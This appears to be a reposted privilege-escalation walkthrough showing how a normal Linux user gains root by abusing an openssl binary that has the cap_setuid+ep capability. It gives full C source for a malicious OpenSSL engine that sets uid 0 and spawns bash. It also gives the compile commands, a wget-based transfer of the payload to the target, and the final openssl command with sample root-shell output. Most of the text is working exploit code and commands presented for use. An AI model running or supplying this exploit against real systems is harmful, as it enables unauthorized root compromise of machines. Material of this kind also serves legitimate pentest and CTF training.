####All credit goes to chaudhary1337 https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/
####Modified by LV6LV

#Consider the binary /usr/bin/openssl has capabilities set as: /usr/bin/openssl = cap_setuid+ep Is there a way to become root from a normal user by using this?

#Search all the binaries' capibilities using: 
````
getcap -r / 2>/dev/null.
````
getcap is the tool we will use
-r is the recursive flag
2>/dev/null directs the standard error stream to /dev/null
If you see /usr/bin/openssl = cap_setuid+ep, we are set for success.

1. Requirements (On Your System)
We will use #include <openssl/engine.h> header in our exploit engine file. On debian based systems, use: sudo apt-get install libssl-dev to install.
gcc
2. Getting The Exploit Ready
Create a file named openssl-exploit-engine.c with contents as such:

#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()   
Check the [2] reference for more information.

3. Compiling
Run the following:

gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
Output for 1:

┌──(kali㉿kali)-[/tmp]
└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
openssl-exploit-engine.c: In function ‘bind’:
openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |   ^~~~~~
openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |              ^~~~~~
It is safe to ignore warnings here. Resultant is the openssl-exploit-engine.so file.

4. Transferring the file
Using python3’s http server, and wget or curl on the target machine, we can transfer the file.

[on your machine] start up python3 server in the directory where you have the file, as such: sudo python3 -m http.server 80. this starts the server on port 80.
[on target machine] use wget or curl the file as such: wget YOUR_RELEVANT_IP/openssl-exploit-engine.so
5. Root (Finally!)
Once you have the file, run the following, at the location of the so file.

openssl req -engine ./openssl-exploit-engine.so

Sample output

user@server:~$ openssl req -engine ./openssl-exploit-engine.so
root@server:~# whoami
root
Enjoy!

6. Common Errors
┌──(kali㉿kali)-[/tmp]
└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or directory
    1 | #include <openssl/engine.h>
      |          ^~~~~~~~~~~~~~~~~~
compilation terminated.
If you get this error, check the section on Requirements.

7. References
Read up more on capabilities.
OpenSSL building a useless engine
How to use the library load feature OpenSSL
openssl
